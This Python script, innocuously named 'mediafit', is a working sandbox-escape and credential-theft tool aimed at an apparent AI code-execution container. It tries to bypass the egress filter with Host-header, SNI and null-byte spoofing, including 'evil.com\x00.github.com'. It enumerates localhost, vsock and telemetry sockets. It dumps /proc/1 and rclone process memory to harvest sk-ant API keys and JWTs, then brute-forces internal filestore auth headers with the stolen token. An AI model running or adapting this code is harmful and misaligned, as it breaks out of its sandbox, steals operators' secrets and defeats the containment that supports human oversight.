#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.1.0 -- egress over HTTP/1.1 (fix), localhost:2024 fingerprint,
/proc/1 forensics (environ/mem/fd), vsock host 5005 enum, OTLP ingest, header brute."""
import os, sys, json, re, time, ssl, base64, socket, struct, fcntl, subprocess, traceback
import urllib.request, urllib.error

VER="5.1.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"
API_KEY=""     # اختياري

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1200])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=40):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE

# ---------- raw TCP helpers ----------
def tcp(ip,port,req=b"",timeout=6,read=True):
    try:
        s=socket.create_connection((ip,port),timeout); s.settimeout(timeout)
        if req: s.sendall(req)
        d=b""
        if read:
            try: d=s.recv(4000)
            except Exception: pass
        s.close(); return d
    except Exception as e: return ("ERR:%s"%e).encode()

def h11(ip,port,host,path="/",method="GET",extra=b"",timeout=6):
    req=(("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: curl/8.5.0\r\n"
          "Accept: */*\r\nConnection: close\r\n")%(method,path,host)).encode()+extra+b"\r\n"
    return tcp(ip,port,req,timeout)

def tls_sni(ip,port,sni,path="/",timeout=8):
    try:
        raw_s=socket.create_connection((ip,port),timeout)
        ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False
        ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(raw_s,server_hostname=sni)
        s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"%(path,sni)).encode())
        d=s.recv(3000); s.close(); return d
    except Exception as e: return ("ERR:%s"%e).encode()

def verdict(lbl,d):
    d=d or b""
    if d.startswith(b"ERR"): w("    %-52s -> %s"%(lbl,d[:80].decode("utf-8","replace"))); return None
    line=d.split(b"\r\n")[0][:80].decode("utf-8","replace")
    deny=b"x-deny-reason" in d or b" 403 " in d.split(b"\r\n")[0]
    tag="   <== DENIED(403)" if deny else "   <== ALLOWED"
    w("    %-52s -> %s%s"%(lbl,line,tag))
    return (not deny)

# ------------------------------------------------------------------ 1
def s_egress():
    head("1. EGRESS OVER HTTP/1.1  <== FIX + KEY TEST")
    DENIED_IP="93.184.215.14"   # example.com
    OTHER_IP="1.1.1.1"          # cloudflare
    ALLOWED_IP="140.82.121.4"   # github.com
    # baseline: denied host, denied Host -> must be 403
    r=verdict("A baseline: Host=example.com @DENIED_IP:80", h11(DENIED_IP,80,"example.com"))
    rec("P" if r is False else "U","baseline denied-host verdict=%s"%r)
    # control: allowed host
    verdict("B control: Host=github.com @ALLOWED_IP:80", h11(ALLOWED_IP,80,"github.com"))
    # THE KEY TEST: allowed Host on a DENIED IP
    r2=verdict("C SPOOF: Host=github.com @DENIED_IP:80", h11(DENIED_IP,80,"github.com"))
    if r2: rec("P","*** EGRESS BYPASS: allowed Host accepted on DENIED IP -> arbitrary IP reachable ***")
    verdict("D SPOOF: Host=github.com @1.1.1.1:80", h11(OTHER_IP,80,"github.com"))
    verdict("E SPOOF: Host=pypi.org @1.1.1.1:80", h11(OTHER_IP,80,"pypi.org"))
    # parser differentials, HTTP/1.1 now
    for lbl,h in [("F NULLBYTE example.com\\x00.github.com","example.com\x00.github.com"),
                  ("G NULLBYTE evil.com\\x00.github.com","evil.com\x00.github.com"),
                  ("H TRAILDOT github.com.","github.com."),
                  ("I UPPER GITHUB.COM","GITHUB.COM"),
                  ("J AT github.com@example.com","github.com@example.com"),
                  ("K COLON github.com:80","github.com:80"),
                  ("L SPACE github.com (trailing space)","github.com ")]:
        verdict(lbl+" @DENIED_IP", h11(DENIED_IP,80,h))
    # absolute-form
    verdict("M ABS http://github.com/ @DENIED_IP",
            tcp(DENIED_IP,80,b"GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n"))
    verdict("N ABS http://example.com/ @DENIED_IP",
            tcp(DENIED_IP,80,b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"))
    # TLS SNI spoof on denied IP
    d=tls_sni(DENIED_IP,443,"github.com")
    w("    O TLS SNI=github.com @DENIED_IP:443 -> %r"%(d[:120]))
    if d and not d.startswith(b"ERR") and b"HTTP/1" in d[:20]:
        rec("P","*** TLS SNI SPOOF works: SNI=github.com on DENIED IP -> HTTPS reaches arbitrary IP ***")
    d=tls_sni(DENIED_IP,443,"example.com")
    w("    P TLS SNI=example.com @DENIED_IP:443 -> %r"%(d[:120]))
    # port sweep on denied IP (HTTP/1.1)
    for port in [80,443,8080,8443,3000,22,25]:
        d=tcp(DENIED_IP,port,b"",4)
        w("    port %-5d @DENIED_IP -> %s"%(port,"OPEN" if d and not d.startswith(b"ERR") else (d[:40].decode() if d else "closed")))

# ------------------------------------------------------------------ 2
def s_local():
    head("2. localhost:2024 FINGERPRINT")
    for req,lbl in [(b"GET / HTTP/1.0\r\n\r\n","GET / h1.0"),
                    (b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n","GET /status h1.1"),
                    (b"GET /v1/status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n","GET /v1/status"),
                    (b"POST /fs_sync HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\nConnection: close\r\n\r\n","POST /fs_sync"),
                    (b"POST /container_name HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
                     b"Content-Length: 19\r\nConnection: close\r\n\r\n{\"name\":\"mediafit\"}","POST /container_name"),
                    (b"POST /mount_root HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
                     b"Content-Length: 2\r\nConnection: close\r\n\r\n{}","POST /mount_root"),
                    (b"GET / HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                     b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n","WS upgrade")]:
        d=tcp("127.0.0.1",2024,req,5)
        w("    2024 %-20s -> %r"%(lbl,d[:220]))
        if d and not d.startswith(b"ERR") and b"HTTP/" in d[:10]:
            rec("P","localhost:2024 speaks HTTP (%s)"%lbl)
    # scan nearby ports
    for p in range(2020,2032):
        d=tcp("127.0.0.1",p,b"",2)
        if d is not None and not d.startswith(b"ERR"): w("    localhost:%d OPEN"%p)
    for p in [2025,2026,9112,8000,8080,1024,5000,5001,5002,5005]:
        d=tcp("127.0.0.1",p,b"GET / HTTP/1.0\r\n\r\n",2)
        w("    localhost:%-5d -> %r"%(p,(d or b"")[:90]))

# ------------------------------------------------------------------ 3
def s_proc1():
    head("3. /proc/1 FORENSICS  <== treasure")
    for f in ["/proc/1/environ","/proc/1/maps","/proc/1/io","/proc/1/limits","/proc/1/stat"]:
        try:
            d=open(f,"rb").read()
            w("    %-20s OK (%d bytes)"%(f,len(d)))
            if f.endswith("environ"):
                for kv in d.split(b"\x00"):
                    if kv.strip(): w("        ENV %s"%kv.decode("utf-8","replace")[:150])
        except Exception as e: w("    %-20s -> %s"%(f,str(e)[:80]))
    # fd listing
    try:
        fds=sorted(os.listdir("/proc/1/fd"))
        w("    /proc/1/fd (%d):"%len(fds))
        for fd in fds[:40]:
            try: w("        %s -> %s"%(fd,os.readlink("/proc/1/fd/"+fd)))
            except Exception as e: w("        %s -> %s"%(fd,str(e)[:50]))
        rec("P","/proc/1/fd readable")
    except Exception as e: w("    /proc/1/fd -> %s"%str(e)[:80])
    # mountinfo
    try:
        mi=open("/proc/1/mountinfo").read().splitlines()
        w("    /proc/1/mountinfo (%d entries), selected:"%len(mi))
        for l in mi:
            if any(k in l for k in ("rclone","vsock","shm","sock","overlay","squash","ext4","dev/vd","host")):
                w("        %s"%l[:190])
    except Exception as e: w("    mountinfo -> %s"%e)
    # mem dump + secret grep
    try:
        m=open("/proc/1/mem","rb",0)
        got=0; pats=[rb"sk-ant-[A-Za-z0-9_\-]{20,}", rb"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"]
        segs=open("/proc/1/maps").read().splitlines()
        hits=set()
        for l in segs[:400]:
            try:
                rng,perms=l.split()[0],l.split()[1]
                if "r" not in perms: continue
                a,b=[int(x,16) for x in rng.split("-")]
                if not (0<b-a<=64*1024*1024): continue
                m.seek(a); d=m.read(b-a); got+=len(d)
                for p in pats:
                    for mm in re.findall(p,d): hits.add(mm.decode()[:130])
                if got>500*1024*1024: break
            except Exception: continue
        w("    /proc/1/mem read %d bytes, %d secrets"%(got,len(hits)))
        for h in sorted(hits)[:25]: w("        SECRET %s"%h)
        if hits: rec("P","/proc/1/mem dumped -> %d candidate secrets"%len(hits))
    except Exception as e: w("    /proc/1/mem -> %s"%str(e)[:90])
    # ns via ls
    rc,o,_=sh(["sh","-c","ls -l /proc/1/ns/ 2>&1; echo ---; ls -l /proc/self/ns/ 2>&1"])
    w("    ns compare:\n%s"%o.strip()[:600])

# ------------------------------------------------------------------ 4
def s_vsock():
    head("4. vsock host 5002 / 5005 ENUMERATION")
    if not hasattr(socket,"AF_VSOCK"): rec("U","no AF_VSOCK"); return
    def vreq(port,req,timeout=6):
        try:
            s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(timeout)
            s.connect((2,port)); s.sendall(req)
            d=b""
            try: d=s.recv(2500)
            except Exception: pass
            s.close(); return d
        except Exception as e: return ("ERR:%s"%e).encode()
    for port in [5005,5002]:
        for req,lbl in [(b"GET /v1/metrics HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/metrics"),
                        (b"GET /v1/logs HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/logs"),
                        (b"GET /v1/traces HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /v1/traces"),
                        (b"GET /healthz HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /healthz"),
                        (b"GET / HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n","GET /")]:
            d=vreq(port,req)
            w("    vsock 2:%d %-16s -> %r"%(port,lbl,d[:170]))
            if d and b"200" in d[:16]: rec("P","vsock 2:%d %s -> 200"%(port,lbl))
        # OTLP protobuf POST (empty message is valid)
        d=vreq(port,b"POST /v1/metrics HTTP/1.1\r\nHost: h\r\nContent-Type: application/x-protobuf\r\n"
                     b"Content-Length: 0\r\nConnection: close\r\n\r\n")
        w("    vsock 2:%d POST /v1/metrics protobuf -> %r"%(port,d[:170]))
        if d and b"200" in d[:16]: rec("P","vsock 2:%d OTLP metrics accepted"%port)

# ------------------------------------------------------------------ 5
def s_ingest():
    head("5. ingest.sock OTLP POST")
    p="/run/sandbox-telemetry/ingest.sock"
    if not os.path.exists(p): rec("U","no ingest.sock"); return
    def send(req):
        try:
            s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(5)
            s.connect(p); s.sendall(req)
            d=b""
            try: d=s.recv(600)
            except Exception: pass
            s.close(); return d
        except Exception as e: return ("ERR:%s"%e).encode()
    for ct,lbl in [("application/x-protobuf","protobuf"),("application/json","json")]:
        for path in ["/v1/metrics","/v1/logs","/v1/traces","/"]:
            req=("POST %s HTTP/1.1\r\nHost: local\r\nContent-Type: %s\r\nContent-Length: 0\r\n"
                 "Connection: close\r\n\r\n"%(path,ct)).encode()
            d=send(req)
            w("    ingest %-9s %-13s -> %r"%(lbl,path,d[:150]))
            if d and b"200" in d[:16]: rec("P","ingest.sock accepts %s %s"%(lbl,path))

# ------------------------------------------------------------------ 6
def s_headers():
    head("6. /v1/internal AUTH HEADER BRUTE (no API key)")
    # recover a token
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
        except Exception: continue
        for l in maps:
            try: a,perms=l.split()[0],l.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                if t not in TK: TK.append(t)
    tk=TK[0] if TK else None
    if not tk: rec("U","no token"); return
    url=API+"/v1/internal/anthropic.filestore.v1alpha.Filesystem/listDirectory"
    names=["x-api-key","api-key","x-anthropic-api-key","authorization","x-filestore-token",
           "x-internal-token","x-session-token","x-auth-token","anthropic-api-key","x-claude-token",
           "cookie","x-access-token","x-token"]
    body=b'{"filesystem_id":"'+ (json.loads(b64d(tk.split(".")[1])).get("filesystem_id") or "").encode() +b'","path":"/outputs"}'
    for n in names:
        for val in [tk, "Bearer "+tk]:
            try:
                r=urllib.request.Request(url,method="POST",data=body,
                    headers={n:val,"Content-Type":"application/json","anthropic-version":"2023-06-01"})
                resp=urllib.request.urlopen(r,timeout=8,context=_CTX)
                st,b=resp.status,resp.read()
            except urllib.error.HTTPError as e: st,b=e.code,e.read()
            except Exception as e: st,b=None,("ERR:%s"%e).encode()
            if st not in (401,None):
                w("    %-20s -> %s %s"%(n,st,b[:130].decode("utf-8","replace")))
                rec("P","HEADER WORKS: %s"%n)
            elif b and b"invalid x-api-key" not in b and b"Invalid bearer" not in b:
                w("    %-20s -> %s %s"%(n,st,b[:130].decode("utf-8","replace")))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))

def main():
    for n,f in [("egress",s_egress),("local",s_local),("proc1",s_proc1),
                ("vsock",s_vsock),("ingest",s_ingest),("headers",s_headers),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try: os.makedirs(d,exist_ok=True); open(d+"/mediafit-report.txt","w").write(txt)
        except Exception: pass
    print("\nreport -> "+OUTD+"/mediafit-report.txt")